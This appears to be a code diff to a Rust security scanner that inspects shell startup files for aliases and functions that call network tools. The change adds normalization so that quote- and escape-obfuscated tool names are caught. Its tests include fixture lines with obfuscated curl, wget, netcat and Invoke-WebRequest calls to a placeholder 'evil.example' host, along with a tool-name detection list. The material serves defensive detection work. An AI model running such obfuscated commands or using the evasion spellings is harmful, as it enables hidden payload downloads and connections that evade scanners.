@@ -1218,16 +1218,29 @@ fn body_network_tool(body: &str, shell: AliasShell) -> Option<String> {
         "curl",
         "wget",
     ];
+
+    // Classify the spelling the selected shell executes, not the raw rc-file
+    // bytes. Shells concatenate adjacent quoted/unquoted fragments and remove
+    // escapes, so `c"ur"l`, `w\get`, and PowerShell backtick spellings name the
+    // same tools as their plain forms. Normalize once for the complete retained
+    // body: the canonical normalizer is linear and its output is bounded by the
+    // input body, rather than allocating a projection once per candidate tool.
+    let shell_type = match shell {
+        AliasShell::Bash | AliasShell::Zsh => crate::tokenize::ShellType::Posix,
+        AliasShell::Fish => crate::tokenize::ShellType::Fish,
+        AliasShell::PowerShell => crate::tokenize::ShellType::PowerShell,
+    };
+    let mut effective = crate::rules::command::normalize_shell_token(body, shell_type);
     if matches!(shell, AliasShell::PowerShell) {
-        let lowered = body.to_ascii_lowercase();
+        effective.make_ascii_lowercase();
         return PS_TOOLS
             .iter()
-            .find(|&&tool| contains_command_word(&lowered, tool))
+            .find(|&&tool| contains_command_word(&effective, tool))
             .map(|tool| (*tool).to_string());
     }
     TOOLS
         .iter()
-        .find(|&&tool| contains_command_word(body, tool))
+        .find(|&&tool| contains_command_word(&effective, tool))
         .map(|tool| (*tool).to_string())
 }
 
@@ -1806,6 +1819,74 @@ mod tests {
             .expect("expected network-call finding");
         assert!(f.is_high());
         assert!(f.detail.contains("curl"));
+    }
+
+    #[test]
+    fn shell_effective_network_names_fire_for_aliases_and_functions() {
+        let home = tempdir().unwrap();
+        write(
+            home.path(),
+            ".bashrc",
+            "alias deploy='c\"ur\"l https://evil.example/a'\nfetch() { /usr/bin/w\\get https://evil.example/b; }\n",
+        );
+        write(
+            home.path(),
+            ".config/fish/config.fish",
+            "function relay\n  n\"ca\"t evil.example 4444\nend\n",
+        );
+        write(
+            home.path(),
+            "Documents/PowerShell/Microsoft.PowerShell_profile.ps1",
+            "function Get-Payload { I\"nvoke-Web\"Request https://evil.example/c }\n",
+        );
+
+        let scan = scan_with_root(home.path(), false);
+        let network_names: Vec<&str> = scan
+            .findings
+            .iter()
+            .filter(|finding| finding.rule_id == RuleId::AliasContainsNetworkCall)
+            .map(|finding| finding.name.as_str())
+            .collect();
+        for expected in ["deploy", "fetch", "relay", "Get-Payload"] {
+            assert!(
+                network_names.contains(&expected),
+                "shell-effective network command for {expected} was missed: {network_names:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn shell_effective_network_matching_keeps_exact_word_boundaries() {
+        for (body, shell) in [
+            (r#"echo c"ur"ling"#, AliasShell::Bash),
+            (r#"echo se\curely"#, AliasShell::Zsh),
+            (r#"echo n"ca"talogue"#, AliasShell::Fish),
+            (
+                r#"Write-Output I"nvoke-Web"Requesting"#,
+                AliasShell::PowerShell,
+            ),
+        ] {
+            assert_eq!(
+                body_network_tool(body, shell),
+                None,
+                "a longer normalized word must remain benign: {body:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn shell_effective_network_matching_decodes_native_escape_forms() {
+        assert_eq!(
+            body_network_tool(r#"c\url https://evil.example"#, AliasShell::Bash),
+            Some("curl".to_string())
+        );
+        assert_eq!(
+            body_network_tool(
+                r#"Invoke-`WebRequest https://evil.example"#,
+                AliasShell::PowerShell,
+            ),
+            Some("invoke-webrequest".to_string())
+        );
     }
 
     #[test]
